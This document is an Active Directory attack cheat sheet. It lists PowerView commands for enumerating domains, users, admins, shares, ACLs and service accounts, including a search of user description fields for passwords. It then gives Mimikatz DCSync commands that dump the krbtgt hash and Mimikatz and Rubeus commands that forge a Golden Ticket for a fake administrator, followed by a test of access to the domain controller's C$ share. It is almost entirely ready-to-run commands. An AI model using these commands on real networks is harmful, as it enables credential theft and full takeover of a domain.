
**Network/Domain Info:**
Get-NetDomain
Get-NetForest
Get-NetDomainController
Get-DomainPolicy
Get-NetGPO

**User Enumeration:**
Get-NetUser
Get-NetGroup
Get-UserProperty -Properties pwdlastset,logoncount,badpwdcount
Get-NetGroupMember "Domain Admins"
Find-UserField -SearchField Description -SearchTerm "pass"

**Computer/Share Enumeration:**
Get-NetComputer -FullData
Get-NetShare
Find-LocalAdminAccess
Get-NetSession
Get-NetLoggedon

**Privilege Enumeration:**
Get-DomainSID
Get-NetLocalGroup
Get-NetGroupMember "Administrators"
Find-DomainUserLocation
Get-DomainTrust

**Service Account Hunting:**
Get-NetUser -SPN
Get-DomainObject -LDAPFilter "(&(samAccountType=805306368)(servicePrincipalName=*))"
Get-NetOU


**ACL enum**
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs
Find-InterestingFile
Get-PathAcl
Get-ModifiablePath

**Sensitive Object Searching**
Find-InterestingDomainAcl
Get-DomainGPOLocalGroup
Find-GPOLocation
Get-DomainGPO


**Kerberos Enumeration:**
Get-DomainSID
Get-NetUser -SPN
Find-DomainUserLocation -UserGroupIdentity "Domain Admins"
Get-DomainTrust

**GPO Analysis:**
Get-DomainGPO
Get-GPOReport
Get-GPPermission
Get-NetGPO | Select DisplayName, GPOSettings


To identify if you can craft TGTs (Golden Ticket attack), there are several ways to check and exploit:
# Using Mimikatz
lsadump::dcsync /domain:contoso.local /user:krbtgt

# Using Invoke-Mimikatz
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:contoso.local /user:krbtgt"'


**Once you have these elements, you can create a Golden Ticket:**
# Using Mimikatz
kerberos::golden /domain:contoso.local /sid:[Domain SID] /krbtgt:[KRBTGT HASH] /user:fakeadmin /ptt

# Using Rubeus
Rubeus.exe golden /domain:contoso.local /sid:[Domain SID] /rc4:[KRBTGT HASH] /user:fakeadmin


Tools to check for TGT vulnerabilities:

- BloodHound
- PowerView
- ADACLScanner
- PingCastle
- Purple Knight
# Check if ticket is loaded
klist

# Test access
dir \\dc01\c$


